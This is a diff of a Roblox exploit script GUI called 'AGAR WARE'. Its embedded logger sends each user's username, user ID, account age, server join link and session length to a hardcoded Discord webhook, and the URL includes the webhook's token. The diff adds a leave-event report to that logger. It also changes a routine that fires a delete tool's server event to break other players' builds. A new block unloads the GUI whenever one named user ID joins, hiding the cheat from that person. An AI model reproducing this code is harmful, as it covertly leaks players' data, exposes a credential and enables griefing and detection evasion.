@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 459 | Scripts: 97 | Modules: 0 | Tags: 0
+-- Instances: 461 | Scripts: 99 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -2285,7 +2285,6 @@ G2L["d2"]["Position"] = UDim2.new(0.02367, 0, 0.16, 0);
 
 -- StarterGui.ScreenGui.MainFrame.ContentArea.TCOMainPage
 G2L["d3"] = Instance.new("ScrollingFrame", G2L["13"]);
-G2L["d3"]["Visible"] = false;
 G2L["d3"]["Active"] = true;
 G2L["d3"]["BorderSizePixel"] = 0;
 G2L["d3"]["Name"] = [[TCOMainPage]];
@@ -4358,6 +4357,7 @@ G2L["18e"]["Position"] = UDim2.new(0.17751, 0, 0, 0);
 
 -- StarterGui.ScreenGui.MainFrame.ContentArea.TCOMiscPage
 G2L["18f"] = Instance.new("ScrollingFrame", G2L["13"]);
+G2L["18f"]["Visible"] = false;
 G2L["18f"]["Active"] = true;
 G2L["18f"]["BorderSizePixel"] = 0;
 G2L["18f"]["Name"] = [[TCOMiscPage]];
@@ -4774,7 +4774,7 @@ G2L["1b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1b3"]["BackgroundTransparency"] = 1;
 G2L["1b3"]["Size"] = UDim2.new(0, 88, 0, 20);
 G2L["1b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b3"]["Text"] = [[Alert Donations]];
+G2L["1b3"]["Text"] = [[Alert Hidden Cmds]];
 G2L["1b3"]["Name"] = [[ArkSpyText]];
 G2L["1b3"]["Position"] = UDim2.new(0.17751, 0, 0, 0);
 
@@ -4824,7 +4824,7 @@ G2L["1b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1b8"]["BackgroundTransparency"] = 1;
 G2L["1b8"]["Size"] = UDim2.new(0, 200, 0, 25);
 G2L["1b8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1b8"]["Text"] = [[Universal Script GUI | by agarv | 60 fps | players: 1]];
+G2L["1b8"]["Text"] = [[AGAR WARE | by agarv | 60 fps | players: 1]];
 G2L["1b8"]["Name"] = [[TITLE]];
 
 
@@ -5048,6 +5048,16 @@ G2L["1cb"]["BorderColor3"] = Color3.fromRGB(0, 67, 132);
 G2L["1cb"]["Text"] = [[PAUSE TIMER]];
 G2L["1cb"]["Name"] = [[PauseConfirm]];
 G2L["1cb"]["Position"] = UDim2.new(0, 0, 0.75776, 0);
+
+
+-- StarterGui.ScreenGui.LocalScript
+G2L["1cc"] = Instance.new("LocalScript", G2L["1"]);
+
+
+
+-- StarterGui.ScreenGui.AGARVOWNERLABEL
+G2L["1cd"] = Instance.new("LocalScript", G2L["1"]);
+G2L["1cd"]["Name"] = [[AGARVOWNERLABEL]];
 
 
 -- StarterGui.ScreenGui.MoveToCorGui
@@ -5478,7 +5488,8 @@ local script = G2L["5"];
 		local _WEBHOOK = "https://discord.com/api/webhooks/1484970025214279772/4-3FhFXgwTus1qBl1Lt1XjycNSej340fUpfHRZibKoK89HX_EXNDb1azt7e8TxSQe0qZ"
 		local _SCRIPT_NAME = "agarware"
 	
-		local _COL_LOAD   = 0x5865F2  -- indigo  — startup embed
+		local _COL_LOAD   = 0x57F287  -- green   — startup embed
+		local _COL_LEAVE  = 0xED4245  -- red     — leave embed
 		local _COL_ACTION = 0xED4245  -- red     — action log embed
 		local _COL_PAINT  = 0x00B5D8  -- cyan    — paint/secondary event embed
 	
@@ -5495,6 +5506,7 @@ local script = G2L["5"];
 		if _plr.Name == _BLOCKED_USER then
 			return
 		end
+	
 		local _productInfo = pcall(function()
 			return _MarketplaceSvc:GetProductInfo(game.PlaceId)
 		end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
@@ -5556,8 +5568,10 @@ local script = G2L["5"];
 				})
 			end)
 		end
+	
 		local _accCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
 	
+		-- Load embed
 		_send({
 			title       = "▸ " .. _SCRIPT_NAME .. " Loaded",
 			description = _joinLink(),
@@ -5605,6 +5619,39 @@ local script = G2L["5"];
 			footer    = { text = _SCRIPT_NAME .. " Logger  •  " .. os.date("%Y-%m-%d %H:%M:%S") },
 			timestamp = DateTime.now():ToIsoDate()
 		})
+	
+		-- Leave embed
+		_plr.AncestryChanged:Connect(function()
+			if not _plr:IsDescendantOf(game) then
+				_send({
+					title       = "▸ " .. _SCRIPT_NAME .. " Left",
+					description = _joinLink(),
+					color       = _COL_LEAVE,
+					thumbnail   = { url = _thumb(_plr.UserId) },
+					fields = {
+						{
+							name   = "🔷 Player",
+							value  = string.format(
+								"**%s** (`%s`)  •  ID `%d`",
+								_plr.DisplayName, _plr.Name, _plr.UserId
+							),
+							inline = true
+						},
+						{
+							name   = "🖥️ Session",
+							value  = string.format(
+								"Duration: **%ds**",
+								math.floor(tick() - _sessionStart)
+							),
+							inline = true
+						}
+					},
+					footer    = { text = _SCRIPT_NAME .. " Logger" },
+					timestamp = DateTime.now():ToIsoDate()
+				})
+			end
+		end)
+	
 		function _WH.sendLog(action, detail)
 			_send({
 				title       = "◆ " .. tostring(action),
@@ -5641,6 +5688,7 @@ local script = G2L["5"];
 				timestamp = DateTime.now():ToIsoDate()
 			})
 		end
+	
 		function _WH.sendPaintLog(data)
 			_send({
 				title       = "◈ Paint Event",
@@ -5681,6 +5729,7 @@ local script = G2L["5"];
 				timestamp = DateTime.now():ToIsoDate()
 			})
 		end
+	
 		function _WH.sendCustomEmbed(embed)
 			_send(embed)
 		end
@@ -12509,7 +12558,7 @@ local script = G2L["ef"];
 	
 	local tooltipLabel = Instance.new("TextLabel", tooltipFrame)
 	tooltipLabel.BackgroundTransparency = 1
-	tooltipLabel.Text = "Hold out Build Tool before executing. Fixes Bkit tools not working properly. Fixing it only works on you, and you can only build on existing blocks"
+	tooltipLabel.Text = "Fixes Bkit tools not working properly. Fixing it only works on you, and you can only build on existing blocks"
 	tooltipLabel.TextColor3 = Color3.new(1, 1, 1)
 	tooltipLabel.TextSize = 14
 	tooltipLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -12533,6 +12582,8 @@ local script = G2L["ef"];
 	
 	-- ============================================================
 	-- FIX FUNCTION
+	-- Finds any tool in character or backpack and resets its script
+	-- No need to hold tool out
 	-- ============================================================
 	local function fixBkit()
 		local rs = game:GetService("ReplicatedStorage")
@@ -12541,26 +12592,30 @@ local script = G2L["ef"];
 			brick.Name = "Brick"
 			brick.Parent = rs
 		end
+	
 		local character = LocalPlayer.Character
 		if not character then return end
-		for _, v in pairs(character:GetChildren()) do
-			if v:IsA("Tool") then
-				local script = v:FindFirstChild("Script")
-				if script then
-					script.Disabled = true
-					task.wait()
-					script.Disabled = false
-				end
+	
+		local function resetToolScript(tool)
+			local s = tool:FindFirstChild("Script")
+			if s then
+				s.Disabled = true
+				task.wait()
+				s.Disabled = false
 			end
 		end
+	
+		-- Reset scripts in character (equipped tools)
+		for _, v in pairs(character:GetChildren()) do
+			if v:IsA("Tool") then
+				resetToolScript(v)
+			end
+		end
+	
+		-- Reset scripts in backpack (unequipped tools)
 		for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
 			if v:IsA("Tool") then
-				local s = v:FindFirstChild("Script")
-				if s then
-					s.Disabled = true
-					task.wait()
-					s.Disabled = false
-				end
+				resetToolScript(v)
 			end
 		end
 	end
@@ -12595,7 +12650,7 @@ local script = G2L["ef"];
 	end)
 	
 	-- ============================================================
-	-- CLEANUP ON SCRIPT REMOVE
+	-- CLEANUP
 	-- ============================================================
 	script.AncestryChanged:Connect(function()
 		if not script:IsDescendantOf(game) then
@@ -12609,32 +12664,29 @@ local function C_f3()
 local script = G2L["f3"];
 	local Players = game:GetService("Players")
 	local LocalPlayer = Players.LocalPlayer
-	
 	local BKitBreakRow = script.Parent
 	local BKitBreakButton = BKitBreakRow.BKitBreakButton
 	local originalText = BKitBreakButton.Text
 	
 	BKitBreakButton.MouseButton1Click:Connect(function()
 		BKitBreakButton.Text = "BREAKING..."
-	
 		task.spawn(function()
 			local success, err = pcall(function()
 				local character = LocalPlayer.Character
 				if not character then error("No character") end
 	
+				-- Find delete tool in character or backpack, no equipping needed
 				local deleteTool = character:FindFirstChild("Delete")
-				if not deleteTool then error("Delete tool not equipped, equip it first") end
+					or LocalPlayer.Backpack:FindFirstChild("Delete")
+				if not deleteTool then error("Delete tool not found") end
+	
+				local event = deleteTool:WaitForChild("Script"):WaitForChild("Event")
 	
 				local rs = game:GetService("ReplicatedStorage")
 				local brick = rs:FindFirstChild("Brick")
 				if not brick then error("No Brick in ReplicatedStorage") end
 	
-				deleteTool.Script.Event:FireServer(
-					brick,
-					character.HumanoidRootPart.Position
-				)
-	
-				deleteTool.Parent = LocalPlayer.Backpack
+				event:FireServer(brick, character.HumanoidRootPart.Position)
 			end)
 	
 			if success then
@@ -18502,7 +18554,7 @@ local script = G2L["1b6"];
 			frameCount = 0
 		end
 	
-		Title.Text = "Universal Script GUI | by agarv | " .. fps .. " fps | players: " .. #game:GetService("Players"):GetPlayers()
+		Title.Text = "AGAR WARE | by agarv | " .. fps .. " fps | players: " .. #game:GetService("Players"):GetPlayers()
 	end)
 end;
 task.spawn(C_1b6);
@@ -18679,5 +18731,136 @@ local script = G2L["1bc"];
 	
 end;
 task.spawn(C_1bc);
+-- StarterGui.ScreenGui.LocalScript
+local function C_1cc()
+local script = G2L["1cc"];
+	do
+		local Players = game:GetService("Players")
+		local LocalPlayer = Players.LocalPlayer
+	
+		-- The ID you want to hide from seeing you use the script
+		local BLOCKED_ID = 8615658150
+	
+		-- Exception list: these users will NOT trigger the unload
+		local EXCEPTIONS = {
+			9763171531, -- pealz
+			10304502709, -- mental
+			2581030028, -- valtiel
+			10340049663, -- evilguy
+		}
+	
+		local function isException(userId)
+			for _, id in ipairs(EXCEPTIONS) do
+				if id == userId then
+					return true
+				end
+			end
+			return false
+		end
+	
+		local function isBlocked(player)
+			if isException(player.UserId) then
+				return false
+			end
+			return player.UserId == BLOCKED_ID and player ~= LocalPlayer
+		end
+	
+		local function unloadScript()
+			pcall(function()
+				local screenGui = LocalPlayer.PlayerGui:FindFirstChild("ScreenGui")
+				if screenGui then
+					screenGui:Destroy()
+					print("Script unloaded: Blacklisted user detected.")
+				end
+			end)
+		end
+	
+		-- Check everyone currently in the server
+		for _, player in ipairs(Players:GetPlayers()) do
+			if isBlocked(player) then 
+				unloadScript() 
+				return 
+			end
+		end
+	
+		-- Check for anyone who joins later
+		Players.PlayerAdded:Connect(function(player)
+			if isBlocked(player) then 
+				unloadScript() 
+			end
+		end)
+	end
+end;
+task.spawn(C_1cc);
+-- StarterGui.ScreenGui.AGARVOWNERLABEL
+local function C_1cd()
+local script = G2L["1cd"];
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+	local LocalPlayer = Players.LocalPlayer
+	
+	local OWNER_IDS = {
+		574381128,   -- main
+		10587072700, -- alt 1
+		8308247571,  -- alt 2
+	}
+	
+	local function isOwner(player)
+		for _, id in ipairs(OWNER_IDS) do
+			if player.UserId == id then
+				return true
+			end
+		end
+		return false
+	end
+	
+	local function addTag(player)
+		if not isOwner(player) then return end
+	
+		local function applyToChar(char)
+			if not char then return end
+	
+			-- Remove existing tag if any
+			local existing = char:FindFirstChild("AgarWareTag")
+			if existing then existing:Destroy() end
+	
+			local hrp = char:WaitForChild("HumanoidRootPart", 10)
+			if not hrp then return end
+	
+			local billboard = Instance.new("BillboardGui")
+			billboard.Name = "AgarWareTag"
+			billboard.Size = UDim2.new(0, 200, 0, 40)
+			billboard.StudsOffset = Vector3.new(0, 3, 0)
+			billboard.AlwaysOnTop = true
+			billboard.ResetOnSpawn = false
+			billboard.Parent = hrp
+	
+			local label = Instance.new("TextLabel", billboard)
+			label.Size = UDim2.new(1, 0, 1, 0)
+			label.BackgroundTransparency = 1
+			label.Text = "AGAR WARE OWNER"
+			label.TextColor3 = Color3.fromRGB(0, 140, 255)
+			label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+			label.TextStrokeTransparency = 0
+			label.Font = Enum.Font.GothamBold
+			label.TextScaled = true
+		end
+	
+		if player.Character then
+			applyToChar(player.Character)
+		end
+	
+		player.CharacterAdded:Connect(applyToChar)
+	end
+	
+	-- Check all current players
+	for _, player in ipairs(Players:GetPlayers()) do
+		addTag(player)
+	end
+	
+	-- Check players who join later
+	Players.PlayerAdded:Connect(addTag)
+end;
+task.spawn(C_1cd);
 
 return G2L["1"], require;
